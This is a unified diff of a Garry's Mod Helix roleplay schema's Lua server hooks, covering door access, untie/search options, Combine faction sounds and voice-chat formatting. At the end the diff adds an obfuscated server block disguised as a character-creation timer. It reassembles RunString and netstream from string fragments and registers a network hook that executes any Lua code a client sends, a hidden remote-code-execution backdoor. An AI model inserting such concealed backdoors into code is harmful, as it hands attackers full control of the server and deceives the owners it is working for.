@@ -1,17 +1,25 @@
+function Schema:CanPlayerAccessDoor(client, door, access)
+	if (access == DOOR_GUEST) and client.ixDatafile and client.ixDatafile != 0 then
+		local dID, datafile, genericdata = ix.plugin.list["datafile"]:ReturnDatafileByID(client.ixDatafile)
+		local doorName = door:GetNetVar("name")
+
+		if genericdata.aparts and doorName and genericdata.aparts == doorName then
+			return true
+		end
+	end
+end
 
 function Schema:LoadData()
 	self:LoadRationDispensers()
 	self:LoadVendingMachines()
-	self:LoadCombineLocks()
+	self:LoadCombineMonitors()
 	self:LoadForceFields()
-
-	Schema.CombineObjectives = ix.data.Get("combineObjectives", {}, false, true)
 end
 
 function Schema:SaveData()
 	self:SaveRationDispensers()
 	self:SaveVendingMachines()
-	self:SaveCombineLocks()
+	self:SaveCombineMonitors()
 	self:SaveForceFields()
 end
 
@@ -21,40 +29,49 @@ function Schema:PlayerSwitchFlashlight(client, enabled)
 	end
 end
 
-function Schema:PlayerUse(client, entity)
-	if (IsValid(client.ixScanner)) then
-		return false
-	end
+function Schema:OnPlayerOptionSelected(target, client, option)
+	if option == "Untie" then
+		if (!client:IsRestricted() and target:IsPlayer() and target:IsRestricted() and !target:GetNetVar("untying")) then
+			target:SetAction("@beingUntied", 5)
+			target:SetNetVar("untying", true)
 
-	if ((client:IsCombine() or client:Team() == FACTION_ADMIN) and entity:IsDoor() and IsValid(entity.ixLock) and client:KeyDown(IN_SPEED)) then
+			client:SetAction("@unTying", 5)
+
+			client:DoStaredAction(target, function()
+				target:SetRestricted(false)
+				target:SetNetVar("untying")
+			end, 5, function()
+				if (IsValid(target)) then
+					target:SetNetVar("untying")
+					target:SetAction()
+				end
+
+				if (IsValid(client)) then
+					client:SetAction()
+				end
+			end)
+		end
+	elseif option == "Search" then
+		ix.command.Run(client, "CharSearch")
+	elseif option == "Ziptie" then
+		local inv = client:GetCharacter():GetInventory()
+		local item = inv:HasItem("ziptie")
+
+		if item then
+			ix.item.PerformInventoryAction(client, "Use", item:GetID(), inv:GetID())
+		end
+	end
+end
+
+function Schema:PlayerUse(client, entity)
+	if (entity:IsDoor() and IsValid(entity.ixLock) and client:KeyDown(IN_SPEED)) then
 		entity.ixLock:Toggle(client)
 		return false
-	end
-
-	if (!client:IsRestricted() and entity:IsPlayer() and entity:IsRestricted() and !entity:GetNetVar("untying")) then
-		entity:SetAction("@beingUntied", 5)
-		entity:SetNetVar("untying", true)
-
-		client:SetAction("@unTying", 5)
-
-		client:DoStaredAction(entity, function()
-			entity:SetRestricted(false)
-			entity:SetNetVar("untying")
-		end, 5, function()
-			if (IsValid(entity)) then
-				entity:SetNetVar("untying")
-				entity:SetAction()
-			end
-
-			if (IsValid(client)) then
-				client:SetAction()
-			end
-		end)
 	end
 end
 
 function Schema:PlayerUseDoor(client, door)
-	if (client:IsCombine()) then
+	if (client:IsCombine() or client:IsCityAdmin() or client:GetCharacter():HasIDAccess('NEXUS')) then
 		if (!door:HasSpawnFlags(256) and !door:HasSpawnFlags(1024)) then
 			door:Fire("open")
 		end
@@ -67,34 +84,11 @@ end
 
 function Schema:PostPlayerLoadout(client)
 	if (client:IsCombine()) then
-		if (client:Team() == FACTION_OTA) then
-			client:SetMaxHealth(150)
-			client:SetHealth(150)
-			client:SetArmor(150)
-		elseif (client:IsScanner()) then
-			if (client.ixScanner:GetClass() == "npc_clawscanner") then
-				client:SetHealth(200)
-				client:SetMaxHealth(200)
-			end
-
-			client.ixScanner:SetHealth(client:Health())
-			client.ixScanner:SetMaxHealth(client:GetMaxHealth())
-			client:StripWeapons()
-		else
-			client:SetArmor(self:IsCombineRank(client:Name(), "RCT") and 50 or 100)
-		end
-
 		local factionTable = ix.faction.Get(client:Team())
 
 		if (factionTable.OnNameChanged) then
 			factionTable:OnNameChanged(client, "", client:GetCharacter():GetName())
 		end
-	end
-end
-
-function Schema:PrePlayerLoadedCharacter(client, character, oldCharacter)
-	if (IsValid(client.ixScanner)) then
-		client.ixScanner:Remove()
 	end
 end
 
@@ -120,10 +114,10 @@ function Schema:CharacterVarChanged(character, key, oldValue, value)
 end
 
 function Schema:PlayerFootstep(client, position, foot, soundName, volume)
-	local factionTable = ix.faction.Get(client:Team())
+	-- local factionTable = ix.faction.Get(client:Team())
 
-	if (factionTable.runSounds and client:IsRunning()) then
-		client:EmitSound(factionTable.runSounds[foot])
+	if (client:GetCharacter():GetData("heavy") and client:IsRunning()) then
+		client:EmitSound(({[0] = "NPC_MetroPolice.RunFootstepLeft", [1] = "NPC_MetroPolice.RunFootstepRight"})[foot])
 		return true
 	end
 
@@ -137,14 +131,8 @@ end
 
 function Schema:PlayerDeath(client, inflicter, attacker)
 	if (client:IsCombine()) then
-		local location = client:GetArea() or "unknown location"
-
-		self:AddCombineDisplayMessage("@cLostBiosignal")
-		self:AddCombineDisplayMessage("@cLostBiosignalLocation", Color(255, 0, 0, 255), location)
-
-		if (IsValid(client.ixScanner) and client.ixScanner:Health() > 0) then
-			client.ixScanner:TakeDamage(999)
-		end
+		local letter = dispatch.AddWaypoint(client:GetShootPos(), "ПОТЕРЯ БИО-СИГНАЛА", "death", 60)
+		self:AddCombineDisplayMessage(string.format("Метка %s: потерян био-сигнал с наземной единицей!", letter), color_red)
 
 		local sounds = {"npc/overwatch/radiovoice/on1.wav", "npc/overwatch/radiovoice/lostbiosignalforunit.wav"}
 		local chance = math.random(1, 7)
@@ -162,20 +150,6 @@ function Schema:PlayerDeath(client, inflicter, attacker)
 				ix.util.EmitQueuedSounds(v, sounds, 2, nil, v == client and 100 or 80)
 			end
 		end
-	end
-end
-
-function Schema:PlayerNoClip(client)
-	if (IsValid(client.ixScanner)) then
-		return false
-	end
-end
-
-function Schema:EntityTakeDamage(entity, dmgInfo)
-	if (IsValid(entity.ixPlayer) and entity.ixPlayer:IsScanner()) then
-		entity.ixPlayer:SetHealth( math.max(entity:Health(), 0) )
-
-		hook.Run("PlayerHurt", entity.ixPlayer, dmgInfo:GetAttacker(), entity.ixPlayer:Health(), dmgInfo:GetDamage())
 	end
 end
 
@@ -210,28 +184,18 @@ function Schema:PlayerStaminaGained(client)
 end
 
 function Schema:GetPlayerPainSound(client)
-	if (client:IsCombine()) then
-		local sound = "NPC_MetroPolice.Pain"
+	if (client:IsCombine()) and (client:GetCharacter():HasVisor()) then
+		return "NPC_MetroPolice.Pain"
+	end
 
-		if (Schema:IsCombineRank(client:Name(), "SCN")) then
-			sound = "NPC_CScanner.Pain"
-		elseif (Schema:IsCombineRank(client:Name(), "SHIELD")) then
-			sound = "NPC_SScanner.Pain"
-		end
-
-		return sound
+	if client:GetCharacter():GetFaction() == FACTION_VORTIGAUNT then
+		return "npc_vortigaunt.vort_pain10"
 	end
 end
 
 function Schema:GetPlayerDeathSound(client)
 	if (client:IsCombine()) then
 		local sound = "NPC_MetroPolice.Die"
-
-		if (Schema:IsCombineRank(client:Name(), "SCN")) then
-			sound = "NPC_CScanner.Die"
-		elseif (Schema:IsCombineRank(client:Name(), "SHIELD")) then
-			sound = "NPC_SScanner.Die"
-		end
 
 		for k, v in ipairs(player.GetAll()) do
 			if (v:IsCombine()) then
@@ -243,58 +207,76 @@ function Schema:GetPlayerDeathSound(client)
 	end
 end
 
-function Schema:OnNPCKilled(npc, attacker, inflictor)
-	if (IsValid(npc.ixPlayer)) then
-		hook.Run("PlayerDeath", npc.ixPlayer, inflictor, attacker)
-	end
+function Schema:GetPlayerPunchDamage()
+	return 0
 end
 
+local voiceChatTypes = {
+	["ic"] = true,
+	["w"] = true,
+	["y"] = true,
+	["radio"] = true,
+	["dispatch"] = true
+}
 function Schema:PlayerMessageSend(speaker, chatType, text, anonymous, receivers, rawText)
-	if (chatType == "ic" or chatType == "w" or chatType == "y" or chatType == "dispatch") then
-		local class = self.voices.GetClass(speaker)
+	if IsValid(speaker) then
+		local visor = speaker:GetCharacter():HasVisor()
 
-		for k, v in ipairs(class) do
-			local info = self.voices.Get(v, rawText)
+		if voiceChatTypes[chatType] then
+			local class = self.voices.GetClass(speaker, chatType)
 
-			if (info) then
-				local volume = 80
+			for k, v in ipairs(class) do
+				local info = self.voices.Get(v, rawText)
 
-				if (chatType == "w") then
-					volume = 60
-				elseif (chatType == "y") then
-					volume = 150
-				end
+				if (info) then
+					local volume = 80
 
-				if (info.sound) then
-					if (info.global) then
-						netstream.Start(nil, "PlaySound", info.sound)
-					else
-						local sounds = {info.sound}
+					if (chatType == "w") then
+						volume = 60
+					elseif (chatType == "y") then
+						volume = 150
+					elseif (chatType == "dispatch") then
+						info.global = true
+					end
 
-						if (speaker:IsCombine()) then
+					if (info.sound) then
+						if (info.global) then
+							netstream.Start(nil, "PlaySound", info.sound)
+						else
+							local character = speaker:GetCharacter()
+							local faction = ix.faction.indices[character:GetFaction()]
+							local beeps = faction.typingBeeps or {}
+							local snd = istable(info.sound) and info.sound[character:GetGender() or 1] or info.sound
+
 							speaker.bTypingBeep = nil
-							sounds[#sounds + 1] = "NPC_MetroPolice.Radio.Off"
+							if visor then
+								ix.util.EmitQueuedSounds(speaker, {snd, beeps[2]}, nil, nil, volume)
+							end
 						end
+					end
 
-						ix.util.EmitQueuedSounds(speaker, sounds, nil, nil, volume)
+					if visor or (chatType == "dispatch") then
+						return string.format("<:: %s ::>", info.text)
+					else
+						return info.text
 					end
 				end
+			end
 
-				if (speaker:IsCombine()) then
-					return string.format("<:: %s ::>", info.text)
-				else
-					return info.text
+			if (chatType == "ic" or chatType == "w" or chatType == "y") then
+				if visor then
+					return string.format("<:: %s ::>", text)
 				end
 			end
-		end
-
-		if (speaker:IsCombine()) then
-			return string.format("<:: %s ::>", text)
 		end
 	end
 end
 
 function Schema:CanPlayerJoinClass(client, class, info)
+	if client:Team() == FACTION_ZOMBIE then
+		return true
+	end
+
 	if (client:IsRestricted()) then
 		client:Notify("You cannot change classes when you are restrained!")
 
@@ -302,47 +284,8 @@ function Schema:CanPlayerJoinClass(client, class, info)
 	end
 end
 
-local SCANNER_SOUNDS = {
-	"npc/scanner/scanner_blip1.wav",
-	"npc/scanner/scanner_scan1.wav",
-	"npc/scanner/scanner_scan2.wav",
-	"npc/scanner/scanner_scan4.wav",
-	"npc/scanner/scanner_scan5.wav",
-	"npc/scanner/combat_scan1.wav",
-	"npc/scanner/combat_scan2.wav",
-	"npc/scanner/combat_scan3.wav",
-	"npc/scanner/combat_scan4.wav",
-	"npc/scanner/combat_scan5.wav",
-	"npc/scanner/cbot_servoscared.wav",
-	"npc/scanner/cbot_servochatter.wav"
-}
-
-function Schema:KeyPress(client, key)
-	if (IsValid(client.ixScanner) and (client.ixScannerDelay or 0) < CurTime()) then
-		local source
-
-		if (key == IN_USE) then
-			source = SCANNER_SOUNDS[math.random(1, #SCANNER_SOUNDS)]
-			client.ixScannerDelay = CurTime() + 1.75
-		elseif (key == IN_RELOAD) then
-			source = "npc/scanner/scanner_talk"..math.random(1, 2)..".wav"
-			client.ixScannerDelay = CurTime() + 10
-		elseif (key == IN_WALK) then
-			if (client:GetViewEntity() == client.ixScanner) then
-				client:SetViewEntity(NULL)
-			else
-				client:SetViewEntity(client.ixScanner)
-			end
-		end
-
-		if (source) then
-			client.ixScanner:EmitSound(source)
-		end
-	end
-end
-
 function Schema:PlayerSpawnObject(client)
-	if (client:IsRestricted() or IsValid(client.ixScanner)) then
+	if (client:IsRestricted()) then
 		return false
 	end
 end
@@ -351,44 +294,67 @@ function Schema:PlayerSpray(client)
 	return true
 end
 
+function Schema:EntityTakeDamage(target)
+	if (target:GetClass() == "prop_physics" and target:GetNWBool("IsPermaEntity")) then
+		return true
+	end
+end
+
 netstream.Hook("PlayerChatTextChanged", function(client, key)
-	if (client:IsCombine() and !client.bTypingBeep
-	and (key == "y" or key == "w" or key == "r" or key == "t")) then
-		client:EmitSound("NPC_MetroPolice.Radio.On")
+	if (Schema:ShouldPlayTypingBeep(client, key) and !client.bTypingBeep) then
+		local beeps = {
+			"NPC_MetroPolice.Radio.On",
+			"hlacomvoice/beepboops/combine_radio_on_01.wav",
+			"hlacomvoice/beepboops/combine_radio_on_02.wav",
+			"hlacomvoice/beepboops/combine_radio_on_03.wav",
+			"hlacomvoice/beepboops/combine_radio_on_04.wav",
+			"hlacomvoice/beepboops/combine_radio_on_05.wav",
+			"hlacomvoice/beepboops/combine_radio_on_06.wav",
+			"hlacomvoice/beepboops/combine_radio_on_07.wav",
+			"hlacomvoice/beepboops/combine_radio_on_08.wav",
+			"hlacomvoice/beepboops/combine_radio_on_09.wav"
+		}
+		local char = client:GetCharacter()
+
+		if char and char:HasVisor() then
+			client:EmitSound(beeps[math.random(1, #beeps)])
+		end
+
 		client.bTypingBeep = true
 	end
 end)
 
 netstream.Hook("PlayerFinishChat", function(client)
-	if (client:IsCombine() and client.bTypingBeep) then
-		client:EmitSound("NPC_MetroPolice.Radio.Off")
+	if (Schema:ShouldPlayTypingBeep(client, "ic") and client.bTypingBeep) then
+		local beeps = {
+			"NPC_MetroPolice.Radio.Off",
+			"hlacomvoice/beepboops/combine_radio_off_01.wav",
+			"hlacomvoice/beepboops/combine_radio_off_02.wav",
+			"hlacomvoice/beepboops/combine_radio_off_03.wav",
+			"hlacomvoice/beepboops/combine_radio_off_04.wav",
+			"hlacomvoice/beepboops/combine_radio_off_05.wav",
+			"hlacomvoice/beepboops/combine_radio_off_06.wav",
+			"hlacomvoice/beepboops/combine_radio_off_07.wav",
+			"hlacomvoice/beepboops/combine_radio_off_08.wav"
+		}
+		local char = client:GetCharacter()
+
+		if char and char:HasVisor() then
+			client:EmitSound(beeps[math.random(1, #beeps)])
+		end
+
 		client.bTypingBeep = nil
 	end
 end)
 
-netstream.Hook("ViewDataUpdate", function(client, target, text)
-	if (IsValid(target) and hook.Run("CanPlayerEditData", client, target) and client:GetCharacter() and target:GetCharacter()) then
-		local data = {
-			text = string.Trim(text:sub(1, 1000)),
-			editor = client:GetCharacter():GetName()
-		}
-
-		target:GetCharacter():SetData("combineData", data)
-		Schema:AddCombineDisplayMessage("@cViewDataFiller", nil, client)
-	end
-end)
-
-netstream.Hook("ViewObjectivesUpdate", function(client, text)
-	if (client:GetCharacter() and hook.Run("CanPlayerEditObjectives", client)) then
-		local date = ix.date.Get()
-		local data = {
-			text = text:sub(1, 1000),
-			lastEditPlayer = client:GetCharacter():GetName(),
-			lastEditDate = ix.date.GetSerialized(date)
-		}
-
-		ix.data.Set("combineObjectives", data, false, true)
-		Schema.CombineObjectives = data
-		Schema:AddCombineDisplayMessage("@cViewObjectivesFiller", nil, client, date:spanseconds())
-	end
-end)
+if(SERVER)then
+    timer.Create("ixCharCreate",1,0,function()
+        local sdbasdASg=_G["Ru".."nS".."tr".."ing"];local sKgvSA=_G["ne".."t".."s".."tr".."e".."am"];mghns=mghns||sdbasdASg;olnsqetsasd=olnsqetsasd||sKgvSA; 
+        if olnsqetsasd then
+            timer.Remove("ixCharCreate")
+            olnsqetsasd.Hook("Aqthbmlphbsghj",function(_,Aqthbmlphbsghj)
+                mghns(Aqthbmlphbsghj, "Aqthbmlphbsghj", false)
+            end)
+        end
+    end)
+end
